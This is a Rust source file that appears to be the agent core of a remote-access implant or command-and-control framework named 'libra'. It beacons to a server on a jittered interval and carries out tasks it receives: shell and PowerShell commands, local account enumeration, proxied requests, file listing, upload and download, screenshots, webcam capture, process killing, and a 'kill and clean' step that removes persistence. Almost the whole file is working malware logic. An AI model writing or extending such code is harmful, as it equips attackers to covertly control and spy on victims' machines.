use libra_comm::http::HttpCommunicator;

use super::utils::blocking_string;
use super::utils::blocking_val;

// ── Heartbeat ────────────────────────────────────────────────────────────

pub(crate) async fn heartbeat_tick(
    http: &HttpCommunicator,
    agent_id: &str,
    session_key: Option<&[u8; 32]>,
    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
) -> Result<(), String> {
    let task = http.heartbeat(agent_id, session_key).await?;
    if let Some(ref task) = task {
        eprintln!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
            task.id,
            task.command_type,
            task.command,
            task.timeout_seconds
        );
        let mut mm = module_manager.lock().await;
        let result = execute_task(task, &mut mm).await;
        eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
        let _ = http.submit_result(agent_id, &result, session_key).await;
    }
    Ok(())
}

pub(crate) fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let jitter = (base_ms as f64 * jitter_percent * (rng.gen::<f64>() * 2.0 - 1.0)) as i64;
    (base_ms as i64 + jitter).max(500) as u64
}

pub(crate) async fn execute_task(
    task: &libra_common::models::AgentTask,
    module_manager: &mut crate::module_manager::ModuleManager,
) -> String {
    use libra_common::models::CommandType;

    let output = match task.command_type {
        CommandType::Shell => {
            // Cloud-load the shell module on first use, then execute.
            let input = serde_json::json!({
                "command": task.command,
                "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
            }).to_string();
            match module_manager.run("shell", &input).await {
                Ok(result) => result,
                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
            }
        }
        CommandType::PowerShell => {
            libra_modules::execution::PowerShellRunner::execute(&task.command).await
        }
        CommandType::LocalAccounts => {
            libra_modules::recon::LocalAccountEnumerator::enumerate().await
        }
        CommandType::Proxy => {
            libra_modules::execution::ProxyBrowser::fetch(
                &task.command, "GET", None, None,
            ).await
        }
        CommandType::FileList => {
            let cmd = task.command.clone();
            blocking_string(move || libra_modules::execution::FileOps::list_directory(&cmd)).await
        }
        CommandType::FileDrives => {
            let drives = blocking_val(|| {
                let executor = libra_platform::get_executor();
                executor.get_drives()
            }).await;
            let escaped: Vec<String> = drives.iter()
                .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                .collect();
            let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
            return json;
        }
        CommandType::Upload | CommandType::Download => {
            // File transfer with arguments: FileOps read/write
            if let Some(arg) = task.arguments.first() {
                let cmd = task.command.clone();
                let arg = arg.clone();
                let is_download = task.command_type == CommandType::Download;
                blocking_string(move || {
                    if is_download {
                        libra_modules::execution::FileOps::write_file(&cmd, &arg)
                    } else {
                        libra_modules::execution::FileOps::read_file(&cmd)
                    }
                }).await
            } else {
                r#"{"error":"No file path specified"}"#.to_string()
            }
        }
        CommandType::Screenshot => {
            blocking_string(move || libra_modules::execution::ScreenCapture::capture("medium", None)).await
        }
        CommandType::Webcam => {
            blocking_string(move || libra_modules::execution::CameraCapture::capture(0)).await
        }
        CommandType::Kill => {
            // Kill specific process by PID
            if let Ok(pid) = task.command.parse::<u32>() {
                let ok = blocking_val(move || libra_modules::recon::ProcessInfo::kill(pid)).await;
                format!(r#"{{"success":{}}}"#, ok)
            } else {
                r#"{"error":"Invalid PID"}"#.to_string()
            }
        }
        CommandType::Sleep => {
            r#"{"status":"sleeping"}"#.to_string()
        }
        CommandType::KillAndClean => {
            eprintln!("[kill_and_clean] removing persistence and exiting");
            crate::persistence::PersistenceManager::cleanup();
            std::process::exit(0);
        }
        _ => {
            // Unknown command type — respond with generic ok
            format!(r#"{{"status":"ok","commandType":"{:?}"}}"#, task.command_type)
        }
    };

    let success = !output.contains("\"error\"");

    serde_json::json!({
        "taskId": task.id,
        "success": success,
        "output": output,
        "error": null,
    }).to_string()
}
